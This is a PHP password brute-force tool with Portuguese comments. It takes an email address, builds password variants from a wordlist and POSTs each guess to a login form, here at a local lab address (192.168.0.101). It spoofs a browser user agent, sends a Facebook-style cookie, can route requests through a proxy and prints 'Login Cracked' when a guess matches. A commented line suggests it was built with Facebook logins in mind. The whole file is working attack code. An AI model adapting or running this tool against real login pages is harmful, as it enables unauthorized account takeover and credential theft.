<?php
include('geraWordlist.php');
$proxy = isset($_GET['proxy'])? $_GET['proxy'] : '' ;
$email =isset($_GET['email'])? $_GET['email'] : '' ;
$wordlist = 'pass.txt';
echo '[+] Uso: bruteforce.php?email=email@email.com<br/>';
echo '[+] Uso: senhas no arquivo pass.txt ou no $_GET words:<br/>';
echo '[+][+][+] bruteforce.php?email=email@email.com&words=wordlist.txt<br/>';
echo '[+][+][+] bruteforce.php?email=email@email.com&words=wordlist.txt&proxy=127.0.0.1:65103<br/>';
function brute($usuario, $senha,$proxy){
      $ch = curl_init();
      //$_GET Method
	  //curl_setopt($ch, CURLOPT_URL, "http://localhost/facebookBruteForce/login.php?nome=".$usuario."&senha=".$senha);
      curl_setopt($ch, CURLOPT_HEADER, false);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      if(trim($proxy) <> '') curl_setopt($ch, CURLOPT_PROXY,$proxy);
	  
      curl_setopt($ch, CURLOPT_URL, "http://192.168.0.101/bruteforce/login.php");
      curl_setopt($ch, CURLOPT_POST, true);
      curl_setopt($ch, CURLOPT_POSTFIELDS, "nome=".$usuario."&senha=".$senha);
      curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36");
      curl_setopt($ch, CURLOPT_COOKIE, "datr=80ZzUfKqDOjwL8pauwqMjHTa");
      curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
      curl_setopt($ch, CURLOPT_COOKIEJAR, "cookies.txt");
      $source = curl_exec($ch);
	  
	   if(preg_match("/<h1>Logged/", $source)){
        return true;
      }else{
        return false;
      }
   
	
	}//Fecha a função
	
	
		
	if(trim($email) <> ""){
		$lines = file($wordlist);
		foreach($lines as $line){
			$line = str_replace("\r","",$line);
			$line = str_replace("\n","",$line);
		
		/*
		if(brute($email, $line,$proxy)){
          print "<br/>-----------------------------------------------------------------------\n\n";
          echo "<br/>[+] Login Cracked -> " . "Email: " . $email . " Senha: " .$line .   "\n\n";
          print "<br/>-------------------------------------------------------------------------\n";
          exit;
        }else{
          echo "<br/>[-] Login NOT Cracked -> " . "Email: " . $email . " Senha: " .$line . "\n";
        }
		*/
		
		    $Words = new geraWordlist($line);
			//$Words->setInf(1);//Deixa Infinito
			//$Words->setPass($pass);
			$Words->setAttempts(10); //Setou 3 tentativas por palavra do arquivo
			$Words->Run();
			$data = $Words->getComb();
			
			foreach($data as $lin){
					if(brute($email, $lin,$proxy)){
					print "<br/>-----------------------------------------------------------------------\n\n";
					echo "<br/>[+] Login Cracked -> " . "Email: " . $email . " Senha: " .$lin.   "\n\n";
					print "<br/>-------------------------------------------------------------------------\n";
					die();
					
					}else{
					echo "<br/>[-] Login NOT Cracked -> " . "Email: " . $email . " Senha: " .$lin . "\n";
					}
				}
			//Super Bruteforce
		



		
		
		
     }
   }
